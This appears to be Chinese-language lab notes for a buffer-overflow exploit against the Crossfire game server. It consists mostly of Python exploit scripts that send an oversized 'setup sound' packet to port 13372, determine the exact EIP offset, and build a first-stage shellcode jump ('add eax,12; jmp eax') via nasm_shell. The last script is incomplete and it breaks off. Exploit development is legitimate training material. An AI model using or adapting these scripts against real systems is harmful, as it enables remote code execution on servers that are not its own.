#!/usr/bin/python
import socket
host="127.0.0.1"
crash='\x41'*4379
buffer="\x11(setup sound" + crash +"\x90\x00#"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host,13372))
data=s.recv(1024)
print data

s.close()
print "[*]Payload Sent!"
crossfire只有在发生了固定大小的字节后，会发生缓冲区溢出，为4379位（4378，4380也可以发生缓冲区溢出，但无法精确修改EIP的参数）

#!/usr/bin/python
import socket
host="127.0.0.1"
crash='A'*4368+'B'*4+'C'*7
buffer="\x11(setup sound" + crash +"\x90\x00#"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host,13372))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent!"
在此缓冲区溢出中，因为需要做到EIP缓冲区的精确溢出，所以长度固定为4379，意味着ESP的溢出长度只有7个字符，不适合做Shellcode的存放位置

6. FUZZING

  • 思路：
  • 第一阶段Shellcode
    • ESP跳转到EAX
    • 偏移12个字节
  • setup sound Shellcode2
  • 🔺命令：./usr/share/metasploit-framework/tools/nasm_shell.rb
    • add eax,12
    • jmp exa
    • \x83\xc0\x0c\xff\xe0\x90\x90（ESP必须是7个字符）
EAX寄存器在不同时间，不同操作系统上的位置是变化的，只能通过系统固定模块去跳转，才能做到多台机器脚本的兼容性，参照windows缓冲区溢出的JMP ESP
  • 🔺命令：./03.py

import socket

crash='A'*4368+'B'*4+'\x83\xc0\x0c\xff\xe0\x90\x90'
buffer="\x11(setup sound" + crash +"\x90\x00#"

print "[*]Sending evil buffer..."
s.connect((host,13372))
